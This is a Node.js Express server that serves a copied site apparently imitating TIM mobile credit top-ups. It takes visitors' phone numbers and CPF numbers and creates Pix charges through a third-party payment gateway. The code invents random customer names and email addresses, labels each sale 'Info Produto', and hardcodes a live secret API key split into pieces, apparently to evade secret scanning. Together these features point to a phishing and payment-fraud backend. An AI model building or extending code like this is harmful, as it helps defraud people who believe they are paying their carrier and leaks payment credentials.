require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the tim-credito.vercel.app directory
app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));

const part1 = 'sk_live_e83eb7792e98d';
const part2 = '74ecd8fbe18d5f816fc';
const part3 = '031f0a5acb1278e0a0e';
const part4 = '0b682fa10f0c3';
const API_KEY = part1 + part2 + part3 + part4;

app.post('/api/pix', async (req, res) => {
    try {
        const { value, phone, cpf } = req.body;
        
        // Convert value string like "20,00" or "24,90" to integer in cents (e.g. 2000, 2490)
        let amountInCents = 2000; // default 20.00
        if (value) {
            const cleanValue = value.replace('R$', '').trim().replace(',', '.');
            amountInCents = Math.round(parseFloat(cleanValue) * 100);
        }

        const cleanPhone = phone ? phone.replace(/\D/g, '') : '11999999999';
        const cleanCpf = cpf ? cpf.replace(/\D/g, '') : '00000000000';
        
        // Random name and email generator
        const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Lucas', 'Julia', 'Marcos', 'Fernanda', 'Carlos', 'Beatriz', 'Rafael', 'Amanda', 'Gabriel', 'Camila'];
        const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho'];
        const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
        const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
        const fullName = `${randomFirstName} ${randomLastName}`;
        const randomEmail = `${randomFirstName.toLowerCase()}.${randomLastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;

        const payload = {
            amount: amountInCents,
            paymentMethod: "pix",
            items: [
                {
                    title: "Info Produto",
                    unitPrice: amountInCents,
                    quantity: 1,
                    tangible: false
                }
            ],
            customer: {
                name: fullName,
                email: randomEmail,
                phone: cleanPhone,
                document: {
                    number: cleanCpf,
                    type: "cpf"
                }
            }
        };

        const response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-API-Key': API_KEY
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();

        if (response.ok) {
            console.log('API Success:', JSON.stringify(data, null, 2));
            res.json(data);
        } else {
            console.error('API Error:', data);
            res.status(400).json(data);
        }

    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Check payment status
app.get('/api/status/:transactionId', async (req, res) => {
    try {
        const { transactionId } = req.params;
        const response = await fetch(`https://api.blackcatoficial.com/api/sales/${transactionId}/status`, {
            headers: {
                'X-API-Key': API_KEY
            }
        });
        const data = await response.json();
        console.log('Status check for', transactionId, ':', JSON.stringify(data));
        res.json(data);
    } catch (error) {
        console.error('Status check error:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Fallback to index.html for other routes
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'tim-credito.vercel.app', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Acesse: http://localhost:${PORT}`);
});
